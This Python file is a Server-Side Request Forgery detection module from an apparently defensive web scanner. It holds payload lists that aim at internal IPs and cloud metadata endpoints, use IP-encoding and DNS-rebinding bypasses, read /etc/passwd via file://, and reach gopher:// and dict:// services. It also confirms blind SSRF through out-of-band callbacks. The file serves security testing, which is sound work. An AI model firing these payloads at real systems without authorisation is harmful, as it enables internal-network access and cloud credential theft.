"""Server-Side Request Forgery (SSRF) detection module."""
import httpx
from .async_base import AsyncBaseAttackModule
from argus.modules.oast import OASTClient, OASTPayloadGenerator
import time
from typing import Optional


class SSRFModule(AsyncBaseAttackModule):
    """Detects Server-Side Request Forgery vulnerabilities.
    
    SSRF allows an attacker to make the server perform HTTP requests
    to arbitrary destinations, potentially accessing internal resources,
    cloud metadata services, or causing denial of service.
    """
    
    # Internal IP ranges to test
    INTERNAL_IPS = [
        '127.0.0.1',
        'localhost',
        '0.0.0.0',
        '10.0.0.1',
        '172.16.0.1',
        '192.168.1.1',
        '169.254.169.254',  # AWS metadata
        '[::1]',  # IPv6 localhost
    ]
    
    # Cloud metadata endpoints
    CLOUD_METADATA = [
        'http://169.254.169.254/latest/meta-data/',  # AWS
        'http://metadata.google.internal/computeMetadata/v1/',  # GCP
        'http://169.254.169.254/metadata/instance?api-version=2021-02-01',  # Azure
    ]
    
    # URL bypass techniques
    BYPASS_PAYLOADS = [
        'http://127.0.0.1',
        'http://localhost',
        'http://0.0.0.0',
        'http://[::1]',
        'http://127.1',
        'http://127.0.1',
        'http://2130706433',  # Decimal IP
        'http://0x7f000001',  # Hex IP
        'http://127.0.0.1.nip.io',  # DNS rebinding
        'http://127.0.0.1.xip.io',
        'http://localtest.me',
        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
        'file:///etc/passwd',
        'file:///c:/windows/win.ini',
        'gopher://127.0.0.1:25',
        'dict://127.0.0.1:11211',
    ]
    
    def name(self) -> str:
        """Return module name."""
        return "ssrf"
    
    def description(self) -> str:
        """Return module description."""
        return "Detects Server-Side Request Forgery vulnerabilities"
    
    def check_applicable(self, parameter: dict, context: dict) -> bool:
        """Check if SSRF testing applies to this parameter.
        
        Args:
            parameter: Parameter dict with 'name', 'value', 'location'
            context: Context dict with 'url', 'method', 'all_params'
        
        Returns:
            bool: True if this module should test the parameter
        """
        param_name = parameter.get('name', '')
        if param_name is None:
            return False
        
        param_name_lower = param_name.lower()
        
        # SSRF-prone parameter names
        ssrf_keywords = [
            'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'redir',
            'next', 'continue', 'return', 'link', 'target', 'to', 'site',
            'navigate', 'open', 'goto', 'view', 'fetch', 'proxy', 'callback',
            'webhook', 'endpoint', 'api', 'service', 'host', 'domain'
        ]
        
        return any(keyword in param_name_lower for keyword in ssrf_keywords)
    
    async def scan(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Scan for SSRF vulnerabilities.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            client: HTTP client
        
        Returns:
            list: Findings
        """
        findings = []
        
        try:
            # Initialize OAST client for blind SSRF detection
            oast_enabled = self.config.get('enable_oast', True)
            oast_client: Optional[OASTClient] = None
            oast_payloads: Optional[OASTPayloadGenerator] = None
            
            if oast_enabled:
                try:
                    oast_client = OASTClient(self.config)
                    oast_client.register()
                    oast_payloads = OASTPayloadGenerator(oast_client)
                except Exception as e:
                    if self.config.get('verbose'):
                        print(f"OAST not available: {e}")
                    oast_client = None
            
            # Get baseline response
            baseline_params = {parameter['name']: parameter['value']}
            baseline_response = await client.get(
                url, 
                params=baseline_params, 
                timeout=self.timeout,
                follow_redirects=False
            )
            baseline_time = 0
            
            # Test OAST payloads first (most reliable for blind SSRF)
            if oast_client and oast_payloads:
                oast_results = await self._test_oast_ssrf(
                    url, parameter, client, oast_client, oast_payloads
                )
                findings.extend(oast_results)
                
                if findings:  # Blind SSRF confirmed via OAST
                    return findings
            
            # Test internal IPs and bypass techniques
            for payload in self.BYPASS_PAYLOADS[:10]:  # Limit to first 10 for efficiency
                try:
                    test_params = {parameter['name']: payload}
                    
                    start_time = time.time()
                    response = await client.get(
                        url,
                        params=test_params,
                        timeout=self.timeout,
                        follow_redirects=False
                    )
                    elapsed_time = time.time() - start_time
                    
                    # Check for SSRF indicators
                    indicators = self._check_ssrf_indicators(
                        response, 
                        baseline_response, 
                        payload,
                        elapsed_time
                    )
                    
                    if indicators:
                        findings.append({
                            'name': 'Server-Side Request Forgery (SSRF)',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': payload,
                            'evidence': indicators,
                            'recommendation': 'Implement strict URL validation, use allowlists for permitted destinations, disable unnecessary protocols, and validate against internal IP ranges'
                        })
                        break  # Found SSRF, stop testing
                        
                except Exception as e:
                    # Timeout or connection errors can indicate SSRF to internal hosts
                    if 'timeout' in str(e).lower() or 'connection' in str(e).lower():
                        if 'file://' in payload or 'gopher://' in payload or 'dict://' in payload:
                            findings.append({
                                'name': 'Potential SSRF - Unusual Protocol',
                                'severity': 'High',
                                'url': url,
                                'parameter': parameter['name'],
                                'payload': payload,
                                'evidence': f'Server attempted to process unusual protocol: {str(e)}',
                                'recommendation': 'Disable support for file://, gopher://, dict:// and other dangerous protocols'
                            })
                            break
                    continue
            
            # Test cloud metadata endpoints
            if not findings:  # Only if SSRF not already detected
                findings.extend(await self._test_cloud_metadata(url, parameter, client))
            
            # Cleanup OAST
            if oast_client:
                oast_client.cleanup()
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"Error in SSRF module: {e}")
        
        return findings
    
    def _check_ssrf_indicators(self, response, baseline_response, payload, elapsed_time) -> str:
        """Check for SSRF indicators in response.
        
        Args:
            response: Test response
            baseline_response: Baseline response
            payload: Payload used
            elapsed_time: Time taken for request
        
        Returns:
            str: Evidence string if SSRF detected, empty string otherwise
        """
        indicators = []
        
        # Check for internal content in response
        internal_patterns = [
            'root:x:0:0',  # /etc/passwd
            '[extensions]',  # win.ini
            'localhost',
            '127.0.0.1',
            'private-',
            'internal-',
            'ami-',  # AWS AMI ID
            'instance-id',
            'metadata',
        ]
        
        response_text = response.text.lower()
        for pattern in internal_patterns:
            if pattern.lower() in response_text and pattern.lower() not in baseline_response.text.lower():
                indicators.append(f'Internal content pattern "{pattern}" found in response')
        
        # Check for significant response differences
        size_diff = abs(len(response.text) - len(baseline_response.text))
        if size_diff > 100:
            indicators.append(f'Response size changed significantly ({size_diff} bytes)')
        
        # Check status code changes
        if response.status_code != baseline_response.status_code:
            if response.status_code in [200, 301, 302, 303, 307, 308]:
                indicators.append(f'Status code changed from {baseline_response.status_code} to {response.status_code}')
        
        # Check for unusual response times (may indicate internal network access)
        if elapsed_time > 3.0:
            indicators.append(f'Unusual response time ({elapsed_time:.2f}s) may indicate internal network access')
        
        # Check for error messages revealing internal structure
        error_patterns = [
            'failed to connect',
            'connection refused',
            'connection timeout',
            'no route to host',
            'network unreachable',
            'protocol not supported',
        ]
        
        for pattern in error_patterns:
            if pattern in response_text and pattern not in baseline_response.text.lower():
                indicators.append(f'Error message revealing internal behavior: "{pattern}"')
        
        return ' | '.join(indicators) if indicators else ''
    
    async def _test_oast_ssrf(self, url: str, parameter: dict, client: httpx.AsyncClient, 
                        oast_client: OASTClient, oast_payloads: OASTPayloadGenerator) -> list:
        """Test for blind SSRF using OAST callbacks.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            client: HTTP client
            oast_client: OAST client instance
            oast_payloads: OAST payload generator
        
        Returns:
            list: Findings
        """
        findings = []
        callback_ids = []
        
        try:
            # Generate and send OAST payloads
            payloads = oast_payloads.ssrf_payloads(parameter['name'])
            
            for payload, callback_id in payloads:
                try:
                    test_params = {parameter['name']: payload}
                    response = await client.get(
                        url,
                        params=test_params,
                        timeout=self.timeout,
                        follow_redirects=False
                    )
                    callback_ids.append(callback_id)
                except:
                    # Even errors don't prevent callback
                    callback_ids.append(callback_id)
            
            # Check for callbacks
            triggered = oast_client.check_callbacks(callback_ids, wait_time=10)
            
            for callback_data in triggered:
                findings.append({
                    'name': 'Blind Server-Side Request Forgery (SSRF)',
                    'severity': 'Critical',
                    'url': url,
                    'parameter': parameter['name'],
                    'payload': f"OAST callback to {callback_data['subdomain']}",
                    'evidence': f"DNS/HTTP callback received from {callback_data.get('remote_address', 'server')} via {callback_data.get('protocol', 'unknown')} protocol. This confirms the server made an outbound request to attacker-controlled domain.",
                    'recommendation': 'Implement strict URL validation with allowlist. Block requests to private IP ranges (RFC1918, RFC4193, RFC3330). Disable unnecessary protocols (file://, gopher://, dict://). Use DNS filtering to prevent resolution of arbitrary domains.'
                })
        
        except Exception as e:
            if self.config.get('verbose'):
                print(f"OAST SSRF test error: {e}")
        
        return findings
    
    async def _test_cloud_metadata(self, url: str, parameter: dict, client: httpx.AsyncClient) -> list:
        """Test access to cloud metadata services.
        
        Args:
            url: Target URL
            parameter: Parameter to test
            session: Requests session
        
        Returns:
            list: Findings
        """
        findings = []
        
        for metadata_url in self.CLOUD_METADATA[:2]:  # Test first 2 for efficiency
            try:
                test_params = {parameter['name']: metadata_url}
                response = await client.get(
                    url,
                    params=test_params,
                    timeout=self.timeout,
                    follow_redirects=False
                )
                
                # Check for cloud metadata indicators
                cloud_indicators = [
                    'ami-',
                    'instance-id',
                    'instance-type',
                    'iam/security-credentials',
                    'computeMetadata',
                    'azureMetadata',
                ]
                
                response_text = response.text.lower()
                for indicator in cloud_indicators:
                    if indicator.lower() in response_text:
                        findings.append({
                            'name': 'SSRF - Cloud Metadata Access',
                            'severity': 'Critical',
                            'url': url,
                            'parameter': parameter['name'],
                            'payload': metadata_url,
                            'evidence': f'Cloud metadata indicator "{indicator}" detected in response',
                            'recommendation': 'Immediately block access to cloud metadata endpoints (169.254.169.254). This can lead to credential theft and complete cloud account compromise.'
                        })
                        return findings  # Critical finding, return immediately
                        
            except Exception:
                continue
        
        return findings
